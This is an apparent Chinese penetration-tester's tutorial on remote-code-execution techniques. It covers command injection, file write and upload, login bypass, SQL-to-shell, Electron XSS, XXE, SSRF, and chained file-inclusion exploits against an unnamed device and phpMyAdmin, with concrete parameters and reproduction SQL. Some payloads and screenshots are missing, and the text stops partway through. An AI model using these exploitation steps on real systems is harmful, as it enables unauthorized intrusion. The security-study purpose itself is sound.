目录  
0 前言与基础概念 
1 exec 无过滤拼接 RCE  易 
2 任意文件写入 RCE 易 
3 文件上传 RCE 中 
4 任意登录后台+后台 RCE 易 
5 SQL 语句执行+写入权限+绝对路径 RCE 易 
6 XSS+electron RCE 易 
7 XXE+php 协议 RCE  易 
8 SSRF+远程文件下载   RCE 中 
9 文件包含 RCE 中上 
10 反序列化 RCE 难 
11 表达式注入 RCE 中上 
12 JNDI 注入 RCE 中上 
13 JDBC+反序列化 RCE 中上 
14 SSTI 注入 RCE 易   
15 缓冲区溢出 RCE 难 
16 php 环境变量注入 RCE 难 
17 POC/EXP 编写 易 
18 Bypass 笔记 易 
前言与基础概念 
RCE 全称 remote command/code execute 
远程代码执行和远程命令执行，那么 RCE 的作用呢？就相当于我可
以在你的电脑中执行任意命令，那么就可以进而使用 MSF/CS 上线你
的主机，就可以完全控制你的电脑了，所以做渗透中，个人认为危害
最大的就是 RCE，你 SQL 注入，我有 RCE 直接连接数据库，你有未
授权/信息泄露，我直接查看这些信息，你有 XSS，我直接改源码，你
有弱口令，我直接扒下来电脑里存储的密码，大多数漏洞能做到的，
RCE 都可以轻而易举的做到，所以我在做挖洞或代审的时候也更会偏
向 RCE 的挖掘，而我在网上发现 RCE 的利用方式有很多，并且像是
XSS 到 RCE，XXE 到 RCE 这种小众的利用手段有很多人都不知道，于
是就有了此文，也算是自己的一个简单笔记总结文章吧，这篇文章写
的我个人认为很全面了几乎涵盖大部分的 RCE 利用手段了，肯定还
有很小众的 RCE 我没发现，不过全面的坏处就是不够深，都是比较浅
的东西，想深入的还是多搜点其他大佬的文章吧 
基础的 shell 符号概念 
cmd1 | cmd2 只执行 cmd2 
cmd1 || cmd2 只有当 cmd1 执行失败后，cmd2 才被执行 
cmd1 & cmd2 先执行 cmd1，不管是否成功，都会执行 cmd2 
cmd1 && cmd2 先执行 cmd1，cmd1 执行成功后才执行 cmd2，否
则不执行 cmd2 
Linux 还支持分号（;），cmd1;cmd2 按顺序依次执行，先执行 cmd1
再执行 cmd2 
php 中也可以用反引号 echo `whoami`; 
exec 无过滤拼接 RCE 
首先是黑盒，平常我们看到了敏感的参数，比如 ping 啊，traceroute
等测试连通性的，百分之80都基本都有命令拼接（但不一定有RCE），
我们以某网关当例子 
看到了 ping 和 traceroute，输入 127.0.0.1 和 1 
然后抓包，第一个包，记住这个 sessionid，要在第二个包的 post 中
添加过去 
第二个包，我们发现参数过滤了 
没有关系，用 traceroute 试试 
可以看到，拼接数据包的时候并没有过滤，这样我们就拿下 rce 了 
那要是有源代码的话我们该如何审计呢，这里以某管理平台做例子，
call_function参数直接post进来，然后switch判断是ping还是tracert，
两边都一样，cmd 直接拼接了 post 的参数，然后 exec 直接输出 
那么直接构造参数就可以造成 rce 
我们除了 exec，还可以全局搜索 system，shell_exec 等命令函数，原
理一样不在赘述，以下为某防火墙的小通杀 
任意文件写入 
当然，这些只是单纯的执行命令，在 php 中还有 file_put_contents 这
种可以写入的函数，例子如下，这是之前 bc 站的源码，应该是一个
小后门,google88990 接受传参，然后 file_put_contents 直接拼接进去，
写入文件 
直接构造 payload 
xxx/xxx/xxx/xx/xxx/GoogleChartMapMarker.php?google88990=phpin
fo(); 
就可以直接 getshell 了 
文件上传 
大家用的最最常见的 rce 方法应该就是文件上传了，这里拿我之前写
过的一篇作为案例 
这里下载源代码 RiteCMS - download 
访问 admin.php，然后输入默认账密 admin admin，再次访问
admin.php 进入后台 
File Manager 
Upload file 
选择文件 
OK-Upload file 
Admin.php 中，进入到 filemanage.inc.php 文件 
进入之后看到fileupload函数，这里new一个类，把对象赋值到upload，
然后全局搜索 
这里赋值了 upload 和 uploaddir 参数 
继续往下走 
在
73
行 有
move_uploaded_file
函 数 进 行 上 传 ， 前 面 的
$this->upload[‘tmp_name’]是之前上传的文件临时文件夹的后缀名，
后面的$this->uploadDir.$tempFileName 是 BASE_PATH.$directory.’/’  
然后回到刚刚的 filemanager.inc.php 文件 
看到 base_path，我们再去全局搜索一下 
在 settings.php 文件中可以到，返回了绝对路径的上一级目录 
然后跟踪 directory 参数 
这里的目录是不固定的，如果判断为 true，则是/files，如果为 false，
则 是/media 
然后继续往下走 
如果为 false 进入 else 语句，调用 savefile 函数 
这里的 filename 和 file_name 是一样的 
该函数直接用 copy 函数将临时文件复制到后面的文件中，成功拿下
rce 
这是 copy 函数中的参数来源 
任意登录后台+后台 RCE 
当然，有的时候可能会进行鉴权，比如只有在后台的时候才可以使用
xx 方法，xx 功能，那么我们要配合信息泄露或者未授权进行组合
combo，如下 
我们可以看到，在 shell_exec 前会判断是否登录了 
那么我们只要有方法不需要实际的账号密码可以进入后台，那么就是
个前台 rce，如下，只需要密码为 hassmedia 就可以成功的进入后台 
SQL 语句执行+写入权限+绝对路径  
还有一种常见的拿 shell 手段是利用 sql 语句，如下 
某次渗透过程中扫描到了一个 3.txt 文件 
可以看到有了绝对路径，那么我们现在就是需要找到 sql 注入点或者
能执行 sql 的方法，访问 phpmyadmin 的时候直接进去了 
权限有了，执行点有了，绝对路径也有了，接下来就是常规的写 shell 
原理就不赘述了，把两个重要语句贴下面了 
当然，如果是 sqlserver 可以直接用 xp_cmdshell 
XSS+electron 
Sql 到 rce 都有了，那么为何不试试 xss 到 rce 呢？先安装好 node.js
和 electron 
使用 npm 下载的话会比较慢，这里可以用另一种方法 
npm install -g cnpm --registry=https://registry.npm.taobao.org 
cnpm install electron -g 
成功安装，然后开始搭建环境 
三个文件搭建好，然后 npm run start 就可以了 
那么如何利用这个去 rce 呢，简单的一句话，在 index.js 中如下 
const exec = require('child_process').exec 
exec('calc.exe', (err, stdout, stderr) => console.log(stdout)) 
下图可以看到成功弹出计算器，造成 rce，那么我们在能 xss 的情况
下，控制前端代码，并且是 electron 框架的时候，即可造成 rce 
大家所熟知的 xss 到 rce 应该就是某剑了，不过因为已经有很多大哥
都写过文章了，这里就不在赘述了，感兴趣的可以去查一查，除了某
剑还有某 by 也曾爆出过 rce 
https://evoa.me/archives/3/#%E8%9A%81%E5%89%91%E5%AE%A2%E6%8
8%B7%E7%AB%AFRCE%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%
A8%8B%E5%8F%8AElectron%E5%AE%89%E5%85%A8 
如果使用 shell.openExternal 那段，命令里面只能使用 file 打开，或者
打开网站，可利用性太小 
打开个计算器还是没啥问题的 
顺便说一下，网上很多都是用 child_process，然后 export function，
但是我实测后发现并不能复现不了，各位师傅可以去看看，最简化版
应该就是以下这两行了 
const exec = require('child_process').exec 
exec('calc.exe') 
XXE+php 协议 
除了 xss 还有一种就是 xxe 到 rce，这里为了方便就不在本地搭环境
了，随便网上找了个靶场去打，可以看到数据是由 xml 进行传输的，
那么我们只要注入恶意 payload 即可造成 xxe 攻击 
但这种情况下，只能造成任意文件读取，xxe 跟 xss 一样，都需要特
定的环境才可以造成 rce，比如说配合 php 的协议，expect 等 
那么我们的语句就可以变成 
]> 
也就造成了 rce（懒得配环境了，感兴趣的可自行测试） 
SSRF+远程文件下载 
还有一种 rce 的方式，是利用 ssrf 配合远程文件下载造成的 rce，如
下，搭建好网站 
分析代码，我们可以看到函数 downloadImage 中，有个 readfile，此
处无过滤，这里就是一个简单的 ssrf，但是在 769 行还有一个
imageStream 
我们跟进来发现其中有个 file_put_contents，可以直接造成远程文件
下载后写入 
有了逻辑我们就可以简单的构造数据包如下： 
成功写入 
文件包含 
（组合拳 0day 分析与 phpmyadmin 分析） 
我们再换一种思路，尝试利用文件包含组合拳 getshell，以下用某设
备的 0day 做示例 
全局搜索 include，发现一处可控的文件包含，这是直接 post 进来的 
然 后 再 次 全 局 搜索 file_put_contents ， 看 看 哪 里 可 以写 入 ， 在
set_authAction 中找到了如下利用点，userName 可控，fileCntent 可
控，filename 直接拼接 userName  
那么 AUTH_DIR 和 DS 呢？这两个参数在最开始的时候已经定义了，
DS 为分隔符，然后 AUTH_DIR 拼接 
但文件包含仅限于/tmp/app_auth/cfile/，我们需要找到一个能创建目
录的利用点，全局搜索 mkdir，发现 dir 可控，shell 直接创建了，那
么整个漏洞逻辑就出来了 
先逐级创建目录 
Post 
创建目录 store=/tmp/app_auth&isdisk=1 
Post 创建目录  store=/tmp/app_auth/cfile&isdisk=1 
post
写
入
文
件
数
据 
serName=../../tmp/app_auth/cfile/sb&auth= 
Post 数据包含 cf=sb.txt 
成功 getshell 
以上是文件包含+txt 文件任意写入+目录创建的组合拳 
还有一个是最近爆出来的 0day，phpmyadmin 文件包含后台 RCE，不
过现在应该打了补丁，但是分析文章还没出来，算是 1day 吧 
复现步骤 
1  
CREATE DATABASE test; CREATE TABLE test.bar ( baz VARCHAR(100) 
PRIMARY KEY ); INSERT INTO test.bar SELECT ''; 
2  
然后点 test 库，再执行 sql 
CREATE TABLE pma__userconfig ( id int(11) NOT NULL, id2 int(11) 
NOT NULL, config_data text NOT NULL, timevalue date NOT NULL, 
username char(50) NOT NULL ) ENGINE=MyISAM DEFAULT 
CHARSET=latin1; 
3 
INSERT INTO pma__userconfig (id, id2, config_data, timevalue, 
username) 
VALUES 
(1, 
2, 
'{\"DefaultTabDatabase\":\"..\/..\/Extensions\/tmp\/tmp\/sess_inhi60cj
t8rojfmjl71jjo6npl\",\"lang\":\"zh_CN\",\"Console\/Mode\":\"collapse\
"}', '2022-05-07', 'root'); 